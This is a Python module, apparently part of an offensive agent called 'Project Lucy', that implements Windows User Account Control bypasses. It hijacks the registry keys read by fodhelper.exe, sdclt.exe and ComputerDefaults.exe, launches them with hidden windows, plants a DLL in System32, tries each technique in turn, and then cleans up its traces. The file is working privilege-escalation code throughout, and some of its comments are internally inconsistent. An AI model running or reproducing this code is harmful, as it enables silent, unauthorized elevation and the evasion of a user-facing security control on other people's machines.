"""
UAC bypass module for Project Lucy agent.
Implements multiple User Account Control bypass techniques on Windows
that allow a high-integrity (non-elevated) process to execute commands
with elevated privileges without prompting the user.

Actions: fodhelper, sdclt, computerdefaults, fodhelper_dll,
         check_uac, auto, cleanup
"""
import ctypes
import os
import platform
import subprocess
import sys
import time

name = "uac_bypass"
version = "1.0.0"
os_compat = ["Windows"]
dependencies: list[str] = []

SYSTEM = platform.system()

# Registry paths that each technique hijacks — tracked for cleanup.
_REGISTRY_ENTRIES = []


def _result(data=None, error=None, status="completed") -> dict:
    return {"status": status, "data": data, "error": error}


def run(action: str = "check_uac", **params) -> dict:
    if SYSTEM != "Windows":
        return _result(error="Windows-only module", status="failed")
    try:
        if action == "fodhelper":
            return _result(data=_fodhelper(params))
        elif action == "sdclt":
            return _result(data=_sdclt(params))
        elif action == "computerdefaults":
            return _result(data=_computerdefaults(params))
        elif action == "fodhelper_dll":
            return _result(data=_fodhelper_dll(params))
        elif action == "check_uac":
            return _result(data=_check_uac())
        elif action == "auto":
            return _result(data=_auto(params))
        elif action == "cleanup":
            return _result(data=_cleanup())
        return _result(error=f"Unknown action: {action}", status="failed")
    except Exception as exc:
        return _result(error=f"uac_bypass:{action} crashed: {exc}", status="failed")


# ---------------------------------------------------------------------------
# UAC level & elevation check
# ---------------------------------------------------------------------------

def _check_uac() -> dict:
    """Check current UAC configuration and whether the process is elevated."""
    import winreg

    result = {"elevated": False, "uac_enabled": False, "consent_level": 0}

    # Check token elevation via GetTokenInformation
    try:
        from ctypes import wintypes

        TOKEN_QUERY = 0x0008
        TokenElevation = 20  # TOKEN_INFORMATION_CLASS value

        class TOKEN_ELEVATION(ctypes.Structure):
            _fields_ = [("TokenIsElevated", wintypes.DWORD)]

        kernel32 = ctypes.windll.kernel32
        advapi32 = ctypes.windll.advapi32

        token = wintypes.HANDLE()
        if kernel32.OpenProcessToken(kernel32.GetCurrentProcess(), TOKEN_QUERY, ctypes.byref(token)):
            elevation = TOKEN_ELEVATION()
            returned = wintypes.DWORD()
            advapi32.GetTokenInformation(
                token, TokenElevation, ctypes.byref(elevation),
                ctypes.sizeof(elevation), ctypes.byref(returned),
            )
            result["elevated"] = bool(elevation.TokenIsElevated)
            kernel32.CloseHandle(token)
    except Exception:
        pass

    # Read UAC settings from registry
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
        )
        try:
            result["uac_enabled"] = bool(winreg.QueryValueEx(key, "EnableLUA")[0])
        except FileNotFoundError:
            result["uac_enabled"] = False

        try:
            result["consent_level"] = winreg.QueryValueEx(key, "ConsentPromptBehaviorAdmin")[0]
        except FileNotFoundError:
            result["consent_level"] = -1

        winreg.CloseKey(key)
    except Exception:
        pass

    # Consent level interpretation
    level_map = {0: "no_prompt", 1: "secure_desktop", 2: "secure_desktop",
                 3: "consent", 4: "consent", 5: "consent_non_secure"}
    result["consent_level_desc"] = level_map.get(result["consent_level"], "unknown")

    result["bypass_possible"] = (
        not result["elevated"]
        and result["uac_enabled"]
        and result["consent_level"] in (0, 1, 2, 3, 4, 5)
    )

    return result


# ---------------------------------------------------------------------------
# Registry helper
# ---------------------------------------------------------------------------

def _reg_write(hive, path, name, value, value_type="sz") -> bool:
    """Write a registry value and track it for cleanup."""
    import winreg

    type_map = {"sz": winreg.REG_SZ, "expand_sz": winreg.REG_EXPAND_SZ, "dword": winreg.REG_DWORD}
    reg_type = type_map.get(value_type, winreg.REG_SZ)

    try:
        key = winreg.CreateKeyEx(hive, path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, name, 0, reg_type, value)
        winreg.CloseKey(key)
        _REGISTRY_ENTRIES.append({"hive": hive, "path": path, "name": name})
        return True
    except Exception:
        return False


def _reg_delete(hive, path, name) -> bool:
    """Delete a registry value."""
    import winreg

    try:
        key = winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, name)
        winreg.CloseKey(key)
        return True
    except Exception:
        return False


def _reg_delete_key(hive, path) -> bool:
    """Delete a registry key (must have no subkeys)."""
    import winreg

    try:
        winreg.DeleteKey(hive, path)
        return True
    except Exception:
        return False


# ---------------------------------------------------------------------------
# fodhelper.exe bypass
# ---------------------------------------------------------------------------

def _fodhelper(params: dict) -> dict:
    r"""
    Bypass UAC via fodhelper.exe.
    fodhelper runs as high integrity and reads:
      HKCU\Software\Classes\ms-settings\Shell\Open\command
    We set that key to our command, launch fodhelper, then clean up.
    """
    import winreg

    command = params.get("command", "") or sys.executable
    reg_path = r"Software\Classes\ms-settings\Shell\Open\command"

    # Set the command
    if not _reg_write(winreg.HKEY_CURRENT_USER, reg_path, None, command):
        return {"status": "error", "error": "Failed to write registry key for fodhelper"}

    # Also set DelegateExecute to empty string (required for some Windows builds)
    _reg_write(winreg.HKEY_CURRENT_USER, reg_path, "DelegateExecute", "")

    # Launch fodhelper.exe
    try:
        subprocess.Popen(
            ["fodhelper.exe"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=0x08000000,  # CREATE_NO_WINDOW
        )
    except Exception as exc:
        return {"status": "error", "error": f"Failed to start fodhelper.exe: {exc}"}

    # Wait for the command to execute
    time.sleep(3)

    # Clean up registry entries
    _reg_delete(winreg.HKEY_CURRENT_USER, reg_path, None)
    _reg_delete(winreg.HKEY_CURRENT_USER, reg_path, "DelegateExecute")
    try:
        _reg_delete_key(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell\Open\command")
        _reg_delete_key(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell\Open")
        _reg_delete_key(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell")
        _reg_delete_key(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
    except Exception:
        pass

    return {
        "status": "ok",
        "technique": "fodhelper",
        "command": command,
        "note": "fodhelper.exe launched; command should execute elevated",
    }


# ---------------------------------------------------------------------------
# sdclt.exe bypass
# ---------------------------------------------------------------------------

def _sdclt(params: dict) -> dict:
    r"""
    Bypass UAC via sdclt.exe (Windows Backup).
    sdclt reads HKCU\Software\Classes\exefile\shell\runas\command\IsolatedCommand.
    """
    import winreg

    command = params.get("command", "") or sys.executable
    reg_path = r"Software\Classes\exefile\shell\runas\command"

    # Set IsolatedCommand to our command
    if not _reg_write(winreg.HKEY_CURRENT_USER, reg_path, "IsolatedCommand", command):
        return {"status": "error", "error": "Failed to write registry key for sdclt"}

    # Launch sdclt.exe
    try:
        subprocess.Popen(
            ["sdclt.exe"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=0x08000000,  # CREATE_NO_WINDOW
        )
    except Exception as exc:
        return {"status": "error", "error": f"Failed to start sdclt.exe: {exc}"}

    time.sleep(3)

    # Clean up
    _reg_delete(winreg.HKEY_CURRENT_USER, reg_path, "IsolatedCommand")

    return {
        "status": "ok",
        "technique": "sdclt",
        "command": command,
        "note": "sdclt.exe launched; command should execute elevated",
    }


# ---------------------------------------------------------------------------
# ComputerDefaults.exe bypass
# ---------------------------------------------------------------------------

def _computerdefaults(params: dict) -> dict:
    """
    Bypass UAC via ComputerDefaults.exe.
    Similar registry hijack approach to fodhelper.
    """
    import winreg

    command = params.get("command", "") or sys.executable
    reg_path = r"Software\Classes\ms-settings\Shell\Open\command"

    # ComputerDefaults uses the same ms-settings key as fodhelper
    if not _reg_write(winreg.HKEY_CURRENT_USER, reg_path, None, command):
        return {"status": "error", "error": "Failed to write registry key for computerdefaults"}

    _reg_write(winreg.HKEY_CURRENT_USER, reg_path, "DelegateExecute", "")

    # Launch ComputerDefaults.exe
    try:
        subprocess.Popen(
            ["computerdefaults.exe"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=0x08000000,  # CREATE_NO_WINDOW
        )
    except Exception as exc:
        return {"status": "error", "error": f"Failed to start computerdefaults.exe: {exc}"}

    time.sleep(3)

    # Clean up
    _reg_delete(winreg.HKEY_CURRENT_USER, reg_path, None)
    _reg_delete(winreg.HKEY_CURRENT_USER, reg_path, "DelegateExecute")
    try:
        _reg_delete_key(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell\Open\command")
        _reg_delete_key(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell\Open")
        _reg_delete_key(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell")
        _reg_delete_key(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
    except Exception:
        pass

    return {
        "status": "ok",
        "technique": "computerdefaults",
        "command": command,
        "note": "computerdefaults.exe launched; command should execute elevated",
    }


# ---------------------------------------------------------------------------
# fodhelper DLL hijack bypass
# ---------------------------------------------------------------------------

def _fodhelper_dll(params: dict) -> dict:
    """
    Bypass UAC via fodhelper DLL hijack.
    fodhelper.exe loads DLLs from writable directories (e.g. System32).
    Place a malicious DLL in a path fodhelper searches before the legitimate location.
    """
    dll_path = params.get("dll_path", "")
    if not dll_path or not os.path.isfile(dll_path):
        return {"status": "error", "error": "A valid dll_path is required"}

    # fodhelper.exe is known to attempt loading 'propsys.dll' from its own directory
    # which is typically C:\Windows\System32 (writable by high-integrity processes).
    # For a UAC bypass, we target the System32 directory where fodhelper runs.
    system32 = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32")
    target_dll = os.path.join(system32, "propsys.dll")

    # Backup existing DLL if present
    backup_path = None
    if os.path.exists(target_dll):
        backup_path = target_dll + ".lucy_bak"
        try:
            import shutil
            shutil.copy2(target_dll, backup_path)
        except Exception:
            pass

    try:
        import shutil
        shutil.copy2(dll_path, target_dll)
    except Exception as exc:
        return {"status": "error", "error": f"Failed to place DLL: {exc}"}

    # Launch fodhelper.exe which will load our DLL
    try:
        subprocess.Popen(
            ["fodhelper.exe"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=0x08000000,
        )
    except Exception as exc:
        return {"status": "error", "error": f"Failed to start fodhelper.exe: {exc}"}

    time.sleep(3)

    # Restore original DLL
    if backup_path and os.path.exists(backup_path):
        try:
            import shutil
            shutil.move(backup_path, target_dll)
        except Exception:
            pass
    else:
        try:
            os.remove(target_dll)
        except Exception:
            pass

    return {
        "status": "ok",
        "technique": "fodhelper_dll",
        "dll_path": dll_path,
        "target": target_dll,
        "note": "DLL placed and fodhelper.exe launched; restore attempted",
    }


# ---------------------------------------------------------------------------
# Auto bypass — try all techniques
# ---------------------------------------------------------------------------

def _auto(params: dict) -> dict:
    """
    Automatically try all bypass techniques until one works.
    Tries fodhelper first, then sdclt, then computerdefaults.
    """
    command = params.get("command", "") or sys.executable

    techniques = [
        ("fodhelper", _fodhelper),
        ("sdclt", _sdclt),
        ("computerdefaults", _computerdefaults),
    ]

    results = []
    for tech_name, tech_fn in techniques:
        r = tech_fn({"command": command})
        results.append({"technique": tech_name, "result": r})
        if r.get("status") == "ok":
            return {
                "status": "ok",
                "technique": tech_name,
                "command": command,
                "all_results": results,
                "note": f"Bypass succeeded via {tech_name}",
            }

    return {
        "status": "failed",
        "error": "All UAC bypass techniques failed",
        "all_results": results,
    }


# ---------------------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------------------

def _cleanup() -> dict:
    """Remove any registry entries created by bypass attempts."""
    import winreg

    cleaned = []

    # Known registry paths used by bypass techniques
    paths_to_clean = [
        (winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell\Open\command"),
        (winreg.HKEY_CURRENT_USER, r"Software\Classes\exefile\shell\runas\command"),
    ]

    for hive, path in paths_to_clean:
        # Delete values
        for val_name in (None, "DelegateExecute", "IsolatedCommand"):
            if _reg_delete(hive, path, val_name):
                cleaned.append(f"{path}\\{val_name or '(default)'}")

        # Try to delete the key tree
        for sub_path in [
            path,
            r"\\".join(path.split("\\")[:-1]),
            r"\\".join(path.split("\\")[:-2]),
            r"\\".join(path.split("\\")[:-3]),
        ]:
            try:
                _reg_delete_key(hive, sub_path)
                cleaned.append(f"key:{sub_path}")
            except Exception:
                pass

    # Clear tracked entries
    _REGISTRY_ENTRIES.clear()

    return {"status": "ok", "cleaned": cleaned}
